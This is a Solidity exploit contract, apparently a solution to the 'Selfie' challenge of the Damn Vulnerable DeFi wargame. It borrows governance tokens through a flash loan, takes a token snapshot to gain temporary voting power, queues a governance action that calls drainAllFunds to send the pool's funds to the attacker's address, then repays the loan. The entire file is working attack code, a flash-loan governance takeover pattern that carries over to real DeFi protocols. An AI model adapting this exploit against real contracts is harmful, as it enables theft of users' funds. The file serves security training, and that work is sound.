// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract AttackSelfie {
    SelfiePool selfiePool;
    SimpleGovernance governance;
    address owner;

    constructor(address _selfiePool, address _governance) {
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
        owner = msg.sender;
    }

    function executeFlashLoan(uint amount) external {
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address governaceToken, uint256 amount) external {
        DamnValuableTokenSnapshot(governaceToken).snapshot();

        governance.queueAction(
            address(selfiePool),
            abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, owner),
            0
        );

        DamnValuableTokenSnapshot(governaceToken).transfer(msg.sender, amount);
    }
}
